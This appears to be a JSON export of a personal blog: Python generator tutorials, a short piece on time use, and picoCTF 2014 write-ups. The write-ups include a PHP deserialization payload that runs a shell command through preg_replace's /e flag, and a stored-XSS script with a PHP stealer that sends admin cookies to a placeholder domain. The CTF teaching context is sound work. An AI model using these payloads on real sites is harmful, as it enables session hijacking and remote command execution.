iterator:\\n            if item == _group:\\n                _count += 1\\n            else:\\n                yield (_count, _group)\\n                _group = item\\n                _count = 1\\n\\n        yield (_count, _group)\\n\\n    groups = grouped(data)\\n    return \\"\\".join(map(str, grouped(data)))\\n\\nprint(run_length_encoding(\\n    \\"WWWWWWWWWWWWBW\\"\\n    \\"WWWWWWWWWWWBBB\\"\\n    \\"WWWWWWWWWWWWWW\\"\\n    \\"WWWWWWWWWWBWWW\\"\\n    \\"WWWWWWWWWWW\\"\\n))\\n```\\n\\n---\\n## Internally Managing a State Machine with Caller-Passed Input\\n\\nFinally, the most general abstraction with generators is achieved when we bring in the `generator.send(...)` functionality.\\nIn other languages, this functionality is called a [coroutine](https://en.wikipedia.org/wiki/Coroutine), but in Python that term is overloaded already with constructs from the `asyncio` module, so best to just referred to this as \\"generators with dot send.\\"\\n\\nSending is the opposite of yielding.\\nWhen we use a generator, upon pausing the function frame and yielding control to the caller, we can yield some data along with that action.\\nSending occurs when we resume the function frame, and along with that action we can also send along some data.\\nAs a result, internal to the function implementation we could be controlling the state of the state machine, and each transition is eating some portion of the input as officiated by whatever the caller `.send()`\'s:\\n\\n```python\\nfrom typing import Any, Callable, Generator\\nfrom functools import wraps\\n\\ndef primed_coroutine(\\n    func: Callable[..., Generator[Any, Any, Any]],\\n) -> Callable[..., Generator[Any, Any, Any]]:\\n    @wraps(func)\\n    def start(*args, **kwargs):\\n        cr = func(*args, **kwargs)\\n        next(cr)\\n        return cr\\n\\n    return start\\n\\nConnectionState = Literal[\\"DISCONNECTED\\", \\"CONNECTING\\", \\"CONNECTED\\", \\"ERROR\\"]\\nConnectionEvent = Literal[\\"connect\\", \\"connect_success\\", \\"connect_fail\\", \\"send_data\\", \\"disconnect\\"]\\n@primed_coroutine\\ndef connection_handler():\\n    state: ConnectionState = \\"DISCONNECTED\\"\\n    while True:\\n        event: ConnectionEvent = yield state\\n        print(f\\"State: {state}, Event: {event}\\")\\n\\n        match (state, event):\\n            case (\\"DISCONNECTED\\", \\"connect\\"):\\n                state = \\"CONNECTING\\"\\n            case (\\"CONNECTING\\", \\"connect_success\\"):\\n                state = \\"CONNECTED\\"\\n            case (\\"CONNECTING\\", \\"connect_fail\\"):\\n                state = \\"ERROR\\"\\n                print(\\"Connection failed, entering error state.\\")\\n                break  # Exit the coroutine\\n            case (\\"CONNECTING\\", \\"disconnect\\"):\\n                state = \\"DISCONNECTED\\";\\n                print(\\"Connection failed, entering error state.\\")\\n                break  # Exit the coroutine\\n            case (\\"CONNECTED\\", \\"send_data\\"):\\n                print(\\"-> Data sent successfully.\\")\\n            case (\\"CONNECTED\\", \\"disconnect\\"):\\n                state = \\"DISCONNECTED\\"\\n            case _:\\n                # Default case for any unhandled state/event combination\\n                print(f\\"-> Cannot \'{event}\' from state \'{state}\'\\")\\n\\nprint(\\"Starting Connection Test...\\")\\nhandler = connection_handler()\\n# (The first .send(None) is handled by the decorator, so we start sending events)\\ncurrent_state = handler.send(\\"connect\\")\\nprint(f\\"New state: {current_state}\\\\n\\")\\ncurrent_state = handler.send(\\"connect_success\\")\\nprint(f\\"New state: {current_state}\\\\n\\")\\ncurrent_state = handler.send(\\"send_data\\")\\nprint(f\\"New state: {current_state}\\\\n\\")\\ncurrent_state = handler.send(\\"disconnect\\")\\nprint(f\\"New state: {current_state}\\\\n\\")\\nhandler.close()\\n```\\n\\n```mermaid\\nstateDiagram-v2\\n    [*] --\x3e DISCONNECTED\\n\\n    DISCONNECTED --\x3e CONNECTING: connect\\n    \\n    CONNECTING --\x3e CONNECTED: connect_success\\n    CONNECTING --\x3e ERROR: connect_fail\\n    \\n    CONNECTED --\x3e CONNECTED: send_data\\n    CONNECTED --\x3e DISCONNECTED: disconnect\\n\\n    ERROR --\x3e [*]\\n```\\n\\nThis is a simple example that enforces permissibility of transitions, but doesn\'t really encapsulate any concerns from the caller yet.\\nHowever, now it is an easy ask to encapsulate a state-dependent behavior that the caller doesn\'t have reason to know about.\\nFor example, this connection handler could buffer the \\"sent\\" data, and then truly dispatch the network request when either reaching a buffer size threshold or upon disconnect:\\n\\n```python\\nfrom textwrap import indent\\n\\nConnectionState = Literal[\\"DISCONNECTED\\", \\"CONNECTING\\", \\"CONNECTED\\", \\"ERROR\\"]\\nConnectionEvent = Literal[\\n    \\"connect\\", \\"connect_success\\", \\"connect_fail\\", \\"send_data\\", \\"disconnect\\"\\n]\\n\\n@primed_coroutine\\ndef connection_handler(\\n    max_buffer_length: int = 2 ** 10,\\n) -> Generator[ConnectionState, Tuple[ConnectionEvent, str | None], None]:\\n    state = \\"DISCONNECTED\\"\\n    buffer = bytearray()\\n\\n    def flush_buffer(b: bytearray) -> None:\\n        print(\\"Flushing buffer\\")\\n        print(indent(b.decode(\\"utf-8\\"), \\"... \\"))\\n        b.clear()\\n\\n    while True:\\n        event, data = yield state\\n        print(f\\"State: {state}, Event: {event}, Data: {data.strip() if data else \'-\'}\\")\\n\\n        match (state, event, data):\\n            case (\\"DISCONNECTED\\", \\"connect\\", None):\\n                state = \\"CONNECTING\\"\\n            case (\\"CONNECTING\\", \\"connect_success\\", None):\\n                state = \\"CONNECTED\\"\\n            case (\\"CONNECTING\\", \\"connect_fail\\", None):\\n                state = \\"ERROR\\"\\n                print(\\"Connection failed, entering error state.\\")\\n                break  # Exit the coroutine\\n            case (\\"CONNECTED\\", \\"send_data\\", str()):\\n                buffer.extend(data.encode(\\"utf-8\\"))\\n                if len(buffer) >= max_buffer_length:\\n                    flush_buffer(buffer)\\n            case (\\"CONNECTED\\", \\"disconnect\\", None):\\n                if len(buffer) > 0:\\n                    flush_buffer(buffer)\\n                state = \\"DISCONNECTED\\"\\n            case _:\\n                # Default case for any unhandled state/event combination\\n                print(\\n                    f\\"-> No transition for event \'{event}\' in state \'{state}\'!\\"\\n                    f\\"Potentially dropping data \'{data}\'!\\"\\n                )\\n\\nprint(\\"Starting Connection Test...\\")\\nhandler = connection_handler(64) # Small buffer for testing\\ncurrent_state = handler.send((\\"connect\\", None))\\ncurrent_state = handler.send((\\"connect_success\\", None))\\ncurrent_state = handler.send((\\"send_data\\", \\"Sphinx of black quartz, judge my vow!\\\\n\\"))\\n# Nothing printed\\ncurrent_state = handler.send((\\"send_data\\", \\"The quick brown fox jumped over the lazy dog.\\\\n\\"))\\n# Both pangrams printed as the buffer is full\\ncurrent_state = handler.send((\\"send_data\\", \\"The five boxing wizards jump quickly?\\\\n\\"))\\n# Nothing printed\\ncurrent_state = handler.send((\\"disconnect\\", None))\\n# The buffer is flushed before disconnect\\nhandler.close()\\n```\\n\\nObviously this connection handler could easily be handled with an object instance, that uses instance members to manage the internal state.\\nHowever, there are affordances that the object instance doesn\'t provide for use cases that involve concurrency.\\n\\nThe first is when the function can unblock during work that is suitable for concurrent processing (network and file operations, generally).\\nThis is extra useful in a language like Python which doesn\'t allow for parallel multi-threading, so the only time that concurrency is a useful speedup is when there is non-blocking IO.\\nIn this use case, the caller would be somehow responsible for handling the completion interrupt and sending back over to the generator code.\\nThis particular approach was critical earlier in Python history, before async await constructs were implemented.\\nHowever, async await is definitely the dominant pattern now to implement non-blocking IO.\\n\\nHowever, the second use that remains is for distributed execution environments.\\nThe generator can define the boundary of execution with another programmatic environment.\\nFor example, imagine you\'re implementing a path finding algorithm with a simple robot.\\nYou can send commands and receive sensor status, but the computation is inherently asynchronous.\\nYou don\'t know how long commands will take to complete, or given the obstacles that the robot faces if they even will be completed!\\n\\nImagine that our program is the robot\'s brain, with the Pythonic compute environment, and we send commands and receive statuses from the robot\'s compute environment, which houses its body and sense.\\nIn this model, it\'s critical that we can suspend and resume the brain execution while the robot\'s compute executes.\\nWith this ability, we can easily avoid busy waiting, and later in our implementation we can actually chain different generators together using a `yield from` syntax to delegate generator execution!\\n\\nThis is all a bit too conceptual, right? Would be nice to see some code?\\nThis is actually the problem set forth in the [DUTC mazerunner problem statement](https://github.com/dutc/mazerunner-bnl-2024/blob/main/README.md), so rather than directly write some code here for you to skim past I\'m leaving it to you, the reader, to jump in and try out a generator implementation yourself!\\nIn addition to the problem statment, the repo includes the general scaffolding around implementation of the brain I mentioned above.\\nIf you\'re curious about my experience grappling with this problem, or have questions about tackling it yourself, please reach out!\\n\\n---\\n## Would I Use This in Large Projects?\\n\\nJust recently I worked on a TUI application that has both a need for yielding from asynchronous branches, and also an internal state machine that governs the application input.\\nUltimately I avoided implementing generators to handle these approachs because the project is in Rust, and there isn\'t a good syntactic pattern to use this pause/resume approach to function evaluation in that language.\\n\\nHowever, if I had been using Python then I ultimately don\'t know if I would have first tackled these async functionalities with a generator based approach.\\nThe async await approach is just much more well-trodden ground.\\nWhile this pattern vastly simplifies several situations described above, there are several very difficult mental obstacles:\\n\\n1. The first/rest and rest/last modalities of how the generator and the caller know it starting, finishing, or in progress.\\n2. The generator or coroutine specializes based on business logic, making it difficult to test that encapsulation.\\n3. When composition of the coroutines comes into play, it\'s a high cognitive burden to reason about!\\n\\nIf you\'ve followed all of the examples here, that\'s great! And maybe you\'re more ready to put this pattern in practice then I am.\\nOn my side, I\'m well ready to reason about generators when the boundary of the pattern is either data-less (the \\"taking turns\\" use-case) or unidirectional (pausing and resuming iteration or data processes).\\nI may require some further iteration through architect -> regret -> revise -> refactor, before I\'m ready to put the full bidirectional strength of coroutines to work!\\nBut I do expect the mental model to be useful in the future."},{"id":"python-generators-part1","metadata":{"permalink":"/blog/python-generators-part1","source":"@site/blog/2023-12-30-generators-in-depth-part1.md","title":"Learning generators part 1: Basics","description":"How generators can be used in four ways (from simple to complex):","date":"2023-12-30T00:00:00.000Z","tags":[],"readingTime":6.5,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"python-generators-part1","title":"Learning generators part 1: Basics","authors":"csressel"},"unlisted":false,"prevItem":{"title":"Learning generators part 2: In depth","permalink":"/blog/python-generators-part2"},"nextItem":{"title":"10 minute moments","permalink":"/blog/many-minutes-few-moments"}},"content":"How generators can be used in four ways (from simple to complex):\\n\\n1. **Lazy-like expressions, including unbounded sequences**\\n2. **Alternating control flow with the caller**\\n3. A \\"pure-looking\\" function, with hidden internal state\\n4. Internally managing a state-machine, that handles caller-passed input\\n\\nThe first two use cases are covered in this article, and serve as a primer to the topic.\\n\\nThe second two use cases are covered in the [second part here](/blog/python-generators-part2), and might provide a new applied usage for those already familiar with generators and coroutines.\\n\\n---\\n\\n## Lazy Expressions and Unbounded Sequences\\n\\nUsers usually first experience lazy-like behavior in Python when iterating through sequences, like so:\\n\\n\x3c!-- truncate --\x3e\\n\\n```python\\nfizzbuzz_squares = []\\n\\n# Doesn\'t ever store 5mil elements at once:\\nfor i in range(5_000_000):\\n    if i ** 2 % 15 == 0:\\n        fizzbuzz_squares.append(i ** 2)\\n\\n# Or more succinctly, with generator comprehension syntax:\\nfizzbuzz_squares = list((i**2 for i in range(5_000_000) if i ** 2 % 15 == 0))\\n```\\n\\nThe `range` function is a builtin that doesn\'t return a generator. Instead, `range()` uses its own class, which implements the Iterable and the Sequence protocols with a lazy design thereof.\\nThis is important so that an interpreter like CPython can execute instructions more quickly using the corresponding C builtin implementation, instead of interpreting comparitively slow Python bytecode.\\n\\nHowever, this behavior is so useful that it is necessary to generalize it for other use csae.\\nTake for example unbounded sequences, where we by necessity need laziness.\\nThe [`count` function from the `itertools` module](https://docs.python.org/3/library/itertools.html#itertools.count) is implemented like so:\\n\\n```python\\ndef count(start=0, step=1):\\n    # count(10) --\x3e 10 11 12 13 14 ...\\n    # count(2.5, 0.5) --\x3e 2.5 3.0 3.5 ...\\n    n = start\\n    while True:\\n        yield n\\n        n += step\\n```\\n\\nTaking this back to our Fizz Buzz snippet, we might use unbounded sequences to calculate our value without actually knowing the stop condition up front.\\nFor example, to get all of the Fizz Buzz squares less than one million:\\n\\n```python\\nfrom itertools import count, takewhile\\n\\nmax_value = 1_000_000\\nfizzbuzz_squares = []\\n\\nfor candidate in count():\\n    squared = candidate ** 2\\n    if max_value <= squared:\\n        break\\n    if squared % 15 == 0:\\n        fizzbuzz_squares.append(squared)\\n\\n# Or more succinctly, with generator comprehension syntax:\\nfizzbuzz_squares = list(takewhile(lambda i: i < max_value, (i ** 2 for i in count() if i ** 2 % 15 == 0)))\\n```\\n\\nEven more useful, is that if we don\'t know how many we need, we can remove that final `list` construction and the entire computation remains lazily delayed.\\nThis is particularly key when the incremental computation that results from your generator involves more expensive work, like network traffic or blocking access to a database.\\nBy pausing and resuming stack frames with the generator, each value is only computed right as it is needed, and the work can be aborted partway through with no extra cost:\\n\\n```python\\nfrom itertools import count\\nfrom time import sleep\\nimport psycopg2\\n\\ndef expensive_queries(cursor):\\n    for candidate in count():\\n        cursor.execute(f\\"<expensive analysis query using {candidate}>\\")\\n        sleep(10)\\n        yield cursor.fetchone()\\n\\nconn = psycopg2.connect(\\"dbname=test user=postgres\\")\\ncursor = conn.cursor()\\nfor result in expensive_queries(cursor):\\n    if result:  # Check some behavior about result\\n        print(f\\"Found result: {result[0]=} {result[1]=} {result[2]=} ...\\")\\n        break\\n\\ncursor.close()\\nconn.close()\\n```\\n\\n---\\n## Alternating Control Flow With the Caller\\n\\nThe next interesting use case for generators highlights the alternation with the caller of the generator.\\nThis is a mechanism by which a reusable piece of code can \\"take turns\\" with the caller.\\nContext managers (that whole `with ... as:` syntax, for setup/teardown behavior) is implemented exactly this way.\\nThis makes sense, as context managers are the most plain alternation of control flow possible: in my reusable code, I\'ll do some setup, then you do whatever you need to do, then I\'ll do some teardown.\\n\\n```python\\nfrom contextlib import contextmanager\\nfrom typing import Generator\\n\\n@contextmanager\\ndef simple_context() -> Generator[None, None, None]:\\n  print(\\"Setup in the generator\\")\\n  try:\\n    yield  # \\"Here is my calling code\\"\\n  finally:\\n    print(\\"Teardown in the generator\\")\\n\\nwith simple_context():\\n  print(\\"Here is my calling code\\")\\n```\\n\\nA further generalization of this control alternation includes taking multiple turns with the caller.\\nThis way the caller can complete any individualized logic that would otherwise need extra modalities baked into the reusable code.\\nThis use case is extensively taught by James Powell in some of his tech talks on generators, so I\'ll just extend [one of his examples](https://www.youtube.com/watch?v=JasPrZqImxo) (based on 13:50):\\n\\n```python\\nfrom typing import Generator\\nfrom logging import getLogger\\n\\nlogger = getLogger(__name__)\\n\\n# All output implementations send the same result:\\n#\\n# New York        150,000\\n# London      (    50,000)\\n# Tokyo           120,000\\n# Berlin                -\\n# Shanghai        210,000\\n\\ndef send_email(lines: str) -> None: pass  # Implementation not relevant\\n\\n# ----\\n# This is awful to modify,\\n# awful to test each modality for regression,\\n# and the testing gets even worse when\\n# you think about combinations thereof\\ndef output_modal(\\n    markets,\\n    filename=None,\\n    to_log=False,\\n    to_email=False,\\n    accounting=False,\\n) -> None:\\n    align = max(map(len, markets))\\n\\n    if to_email:\\n        lines = []\\n\\n    for region, profit in markets.items():\\n        if accounting:\\n            if profit < 0:\\n                profit = \\"({:>10,})\\".format(-profit)\\n            elif profit > 0:\\n                profit = \\" {:>10,}\\".format(profit)\\n            else:\\n                profit = \\" {:>10}\\".format(\\"-\\")\\n\\n        line = \\"{region:<{align}}    {profit}\\".format(\\n            region=region, profit=profit, align=align\\n        )\\n\\n        if filename:\\n            with open(filename) as f:\\n                f.write(line)\\n        if to_email:\\n            lines.append(line)\\n        if to_log:\\n            logger.info(line)\\n        print(line)\\n\\n    if to_email:\\n        send_email(\\"\\\\n\\".join(lines))\\n\\n# ----\\n# Functional programming inversion of modal control on just the formatting\\ntemplate = \\"{region:<{align}}    {profit}\\".format\\ndef accounting(p) -> str:\\n    # Here\'s where \\"Pythonic\\" approaches are unreadable BS imo:\\n    # return {1: \\" {:10,}\\", -1: \\"({:>10,})\\", 0: \\" {:>10}\\".format(\\"-\\")}[(p > 0) - (p < 0)].format(abs(p))\\n\\n    match (p > 0, p < 0):\\n        # Structural pattern matching is good as of 3.10, use it!\\n        case (True, False):\\n            return \\" {:10,}\\".format(p)\\n        case (False, True):\\n            return \\"({:>10,})\\".format(-p)\\n        case _:\\n            return \\" {:>10}\\".format(\\"-\\")\\ndef output_functional(\\n    markets,\\n    write=print,\\n    template=template,\\n    accounting=accounting,\\n) -> None:\\n    align = max(map(len, markets))\\n    for region, profit in markets.items():\\n        write(template(region=region, profit=accounting(profit), align=align))\\n\\n# ----\\n# Even better yet, invert more modal control on the output using generators\\ndef output_generators(\\n    markets,\\n    template=template,\\n    accounting=accounting,\\n) -> Generator[str, None, None]:\\n    align = max(map(len, markets))\\n    for region, profit in markets.items():\\n        line = template(region=region, profit=accounting(profit), align=align)\\n        yield line\\n\\n\\nif __name__ == \\"__main__\\":\\n    markets_data = {\\n        \\"New York\\": 150000,\\n        \\"London\\": -50000,\\n        \\"Tokyo\\": 120000,\\n        \\"Berlin\\": 0,\\n        \\"Shanghai\\": 210000,\\n    }\\n\\n    # Output modal is a monstrosity internally to read and maintain\\n    output_modal(\\n        markets_data,\\n        to_log=True,\\n        to_email=True,\\n        accounting=True,\\n    )\\n\\n    # Even though output with functional style is easier to maintain,\\n    # it\'s still harder to call:\\n    email_lines = []\\n    write_log = logger.info\\n    write_email = email_lines.append\\n    output_functional(markets_data, write=print)\\n    output_functional(markets_data, write=write_log)\\n    output_functional(markets_data, write=write_email)\\n    send_email(\\"\\\\n\\".join(email_lines))\\n\\n    # Whereas output with generators is much cleaner:\\n    email_lines = []\\n    for line in output_generators(markets_data):\\n        print(line)\\n        logger.info(line)\\n    send_email(\\"\\\\n\\".join(email_lines))\\n```\\n\\nWhile my preferences usually lean toward a functional approach, the generators have additional advantages.\\nThe generator approach is shorter, and I would argue significantly clearer, because all necessary context about the output modalities is correctly placed with the calling code.\\nThe maintainability is also improved, as formatting changes only touch the formatting functions, data structure changes only touch the function internals, and output interface changes are in one place with the caller.\\n\\nAdditionally, the generators can also have a different or better runtime profile over the functional one, during scenarios where the number of alternations is very high (since each \\"turn taking\\" step alternates between pre-existing function frames that are paused and resumed instead of creating and destroying them repeatedly).\\nJust be warned, this isn\'t unilaterally true, as there is additional overhead for constructing the `Generator` object, which a function call does not incur.\\n\\nThose topics, Lazy-like expressions and sequences and control flow alternation, was about where my understanding of generators stopped until recently. The [second part of this article](/blog/python-generators-part2) may introduce one or two new code abstractions for your toolbox, as it did for me!"},{"id":"many-minutes-few-moments","metadata":{"permalink":"/blog/many-minutes-few-moments","source":"@site/blog/2023-05-28-many-minutes-few-moments.md","title":"10 minute moments","description":"16 waking hours \xf7 10 minutes = 96","date":"2023-05-28T00:00:00.000Z","tags":[],"readingTime":0.47,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"many-minutes-few-moments","title":"10 minute moments","authors":"csressel"},"unlisted":false,"prevItem":{"title":"Learning generators part 1: Basics","permalink":"/blog/python-generators-part1"},"nextItem":{"title":"picoCTF 2014 part 3: Steve\'s List","permalink":"/blog/picoctf-2014-part3"}},"content":"> 16 waking hours \xf7 10 minutes = 96\\n>\\n> 10 minutes is ~1% of your day.\\n\\n\\\\- [credit to Taylor Troesh](https://taylor.town/10-minutes)\\n\\nWhen the phone scrolling lasts for 10 minutes, or low-priority yak shaving adds up to 10 minutes, that\'s one percent of your day spent.\\nThat\'s not necessarily a bad thing or a good thing, but make sure it\'s a thing you want to have spent one percent of your day on.\\n\\nYou only have this many 10 minute moments.\\n\\n<pre style={{ width: \\"min-content\\" }}>\\n\ud83e\udd71  \ud83d\udcf1  \ud83e\udea5  \ud83c\udf73  \ud83e\udd50  \ud83d\udcf1\\n\u2615  \ud83e\udde5  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udebd\\n\ud83d\udcac  \ud83d\udce7  \ud83c\udfa7  \ud83d\udcbb  \ud83d\udcde  \ud83d\udcbb\\n\ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \u2615  \ud83d\udcbb\\n\ud83d\udcde  \ud83d\udcbb  \ud83d\udcf1  \ud83c\udfa7  \ud83d\udcbb  \ud83d\udcbb\\n\ud83d\udcac  \ud83d\udcbb  \ud83d\udcf1  \ud83c\udf71  \ud83c\udf71  \ud83d\udcf1\\n\u2615  \ud83d\udcbb  \ud83d\udcde  \ud83d\udcbb  \ud83d\udcbb  \ud83c\udfa7\\n\ud83d\udebd  \ud83d\udcf1  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udce7  \ud83d\udcbb\\n\ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb\\n\ud83d\udcbb  \ud83d\udcac  \ud83e\udd6a  \ud83d\udcf1  \ud83d\udcbb  \ud83d\ude97\\n\ud83d\uded2  \ud83d\uded2  \ud83d\ude97  \ud83e\udd4f  \ud83e\udd4f  \ud83c\udfc3\\n\ud83c\udfc3  \ud83e\udd4f  \ud83e\udd4f  \ud83e\udd4f  \ud83c\udfcb\ufe0f  \ud83c\udfcb\ufe0f\\n\ud83c\udfcb\ufe0f  \ud83c\udfcb\ufe0f  \ud83e\uddd8  \ud83e\uddd8  \ud83d\ude97  \ud83d\ude97\\n\ud83d\udec1  \ud83c\udf72  \ud83c\udf72  \ud83d\udcfa  \ud83d\udcfa  \ud83d\udcf1\\n\ud83d\udcfa  \ud83d\udcbb  \ud83d\udebd  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb\\n\ud83e\udea5  \ud83d\udcd6  \ud83d\udcd6  \ud83d\udcd6  \ud83d\udcd6  \ud83d\udecc\\n</pre>\\n\\nMany minutes, but few moments.\\n\\n\x3c!-- truncate --\x3e"},{"id":"picoctf-2014-part3","metadata":{"permalink":"/blog/picoctf-2014-part3","source":"@site/blog/2014-12-01-picoctf-part3.md","title":"picoCTF 2014 part 3: Steve\'s List","description":"Summary","date":"2014-12-01T00:00:00.000Z","tags":[],"readingTime":4.25,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"picoctf-2014-part3","title":"picoCTF 2014 part 3: Steve\'s List","authors":"csressel"},"unlisted":false,"prevItem":{"title":"10 minute moments","permalink":"/blog/many-minutes-few-moments"},"nextItem":{"title":"picoCTF 2014 part 2: secure_page_service","permalink":"/blog/picoctf-2014-part2"}},"content":"Summary\\n--------------\\nHash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website\u2019s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it\u2019s destroy method will be called. This method has been redefined to output the Post\u2019s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the \u2018e\u2019 flag, allowing us to do arbitrary command execution. By catting the necessary file at `/home/daedalus/flag.txt`, and substituting all of the Post\u2019s text with the file\u2019s contents, we can print the file\u2019s contents in an HTML comment, and thus get the flag.\\n\\n\x3c!--truncate--\x3e\\n\\nThe Hash Extension\\n-----------------------------\\nExamination of the hacked website shows the only possible input is through the cookies.\\nHowever, any attempts to manipulate the cooke result in us being locked out of the website.\\n\\nExamination of the website source makes it quickly apparent why:\\n```PHP\\n$custom_settings = urldecode($_COOKIE[\'custom_settings\']);\\n$hash = sha1(AUTH_SECRET . $custom_settings);\\nif ($hash !== $_COOKIE[\'custom_settings_hash\']) {\\n  die(\\"Why would you hack Section Chief Steve\'s site? :(\\");\\n}\\n```\\nThe cookie `custom_settings` will later be deserialized, and will be the site of our object inject. However, `custom_settings_hash` will need to change in a similar manner.\\n\\nTo not fail the validation, `custom_settings_hash` needs to be of the form `sha1(AUTH_SECRET . urldecode($_COOKIE[\'custom_settings\']))` where `AUTH_SECRET` is an unknown, eight letter secret.\\nAs we do not have access to `AUTH_SECRET`, it would appear that we are unable to change the `custom_settings` cookie.\\n\\nHowever, using a hash extension attack, we can change the value of `custom_settings_hash` to correspond to our new value of `custom_settings` without knowledge of the `AUTH_SECRET`.\\n\\nThe tool to be used is called <a href=\'https://github.com/iagox86/hash_extender\'>hash extender</a>. By downloading and compiling the program, we can generate the new value of `custom_settings_hash` with the following command:\\n\\n```Shell\\n$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table\\n```\\nwhere `d` is the previous `custom_settings`, `a` is the addition to the `custom_settings` (or the object injection), and s is the previous value of `custom_settings_hash`.\\n\\nWith this value, we can now manipulate `custom_settings` without tripping Steve\u2019s rudimentary IPS.\\n\\nThe Object Injection\\n-----------------------------\\nThere are several important items to notice while reading the source of the website.\\n\\n1. Whatever is in the `custom_settings` cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized.\\n2. In the `classes.php` file, the Post\u2019s `__destruct()` method is redefined. It now is intended to output the Post\u2019s fields in comments, as \u201cdebugging stuff.\u201d\\n3. The Filter class used by the Post\u2019s `__destruct()` method uses the `preg_replace()` method with class fields as arguments.\\n\\nThese three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the `custom_settings` cookie.\\n\\nThe necessary object to cat the flag from `/home/daedalus/flag.txt` will look something like this in PHP:\\n\\n```PHP\\n$filter_set = [\\n\\t\\tnew Filter(\'/.*/e\', \'system(\\"cat /home/daedalus/flag.txt\\")\')\\n\\t];\\n$obj = serialize(true) . \\"\\\\n\\" . serialize(new Post(\\n\\t\\"the flag is\\",\\n\\t\\"fail\\",\\n\\t$filter_set));\\n```\\nThe Filter uses the \u201ce\u201d flag on the `preg_replace()` call. This will run the replacement argument as PHP code and replace the matching text with the output.\\n\\nBy having out only filter match everything, and run the command `$ cat /home/daedalus/flag.txt`, we will replace the body of the Post we inject with the flag.\\n\\nOutputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of `custom_settings_hash`. It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste.\\n\\nFinally, by replacing `custom_settings` with a urlencoding of the serialized object, and `custom_settings_hash` with the new signature, we will see the flag in the comments of the site:\\n\\nD43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve\\n\\n----\\n\\nNote: the payload for `custom_settings` will look something like:\\n```\\nb%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D\\n```\\nHowever, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup."},{"id":"picoctf-2014-part2","metadata":{"permalink":"/blog/picoctf-2014-part2","source":"@site/blog/2014-11-30-picoctf-part2.md","title":"picoCTF 2014 part 2: secure_page_service","description":"Summary","date":"2014-11-30T00:00:00.000Z","tags":[],"readingTime":2.32,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"picoctf-2014-part2","title":"picoCTF 2014 part 2: secure_page_service","authors":"csressel"},"unlisted":false,"prevItem":{"title":"picoCTF 2014 part 3: Steve\'s List","permalink":"/blog/picoctf-2014-part3"},"nextItem":{"title":"picoCTF 2014 part 1: Injection 2","permalink":"/blog/picoctf-2014-part1"}},"content":"Summary\\n--------------\\nThis problem is a simple XSS challenge. Using persistent XSS in a newly created page, we can steal the admin\u2019s cookies should they choose to visit the page. The \u201cReport to Moderator\u201d button says, \u201cReport this page, and a moderator will personally review it in the next few minutes!\u201d so it is a safe assumption that we can have an admin view our injected code.\\n\\n\x3c!--truncate--\x3e\\n\\nRecon\\n----------\\nThe first thing we need is an account on the challenge\'s site. The home page allows anyone to register. After an account is made, two actions are available: create a page, and view a page. Attempting to view the page asked for in the problem shows it is password protected. A couple quick queries show it is not vulnerable to SQL injection; another route is necessary.\\n\\nExamining the page creation by creating a couple random pages, we notice that we can report pages to be reviewed by a moderator (\u201cSpam? Abuse? Report this page, and a moderator will personally review it in the next few minutes!\u201d).\\n\\nFurthermore, attempting to use HTML tags reveals that the input allows HTML code.\\n\\nEnter XSS\\n---------------\\nWe can use a persistent XSS attack to steal the cookies of whoever views the page. By injecting a script into the page, we can send the viewer\u2019s cookies elsewhere. By setting up a php script on a free hosting script, we can redirect the sent cookies to our own email. The final step will be to report the page to moderator to cause them to view our injected page.\\n\\nOnce we have the admin\u2019s cookies, we can change our cookies to theirs to view the locked page.\\n\\nThe Setup\\n---------------\\nFirst we need the two scripts.\\n\\nThe injected script for the page will be:\\n```html\\n<script>location.href = \'http://www.YourDomainName.com/cookiestealer.php?cookie=\'+document.cookie;<\/script>\\n````\\n\\nAnd the php script at the above domain name (cookiestealer.php) will look like:\\n```php\\n<?php\\n$cookie = $HTTP_GET_VARS[\\"cookie\\"]; mail(\\"YourEmail@YouMailProvider.com\\", \\"Stolen Cookies\\", $cookie);\\n?>\\n```\\n\\nFor free hosting, a number of options are available. We chose to use <a href=\'http://www.000webhost.com/\'>000webhost</a>, simply because they have a nice in-browser file manager\u2014no need to mess around with FTP 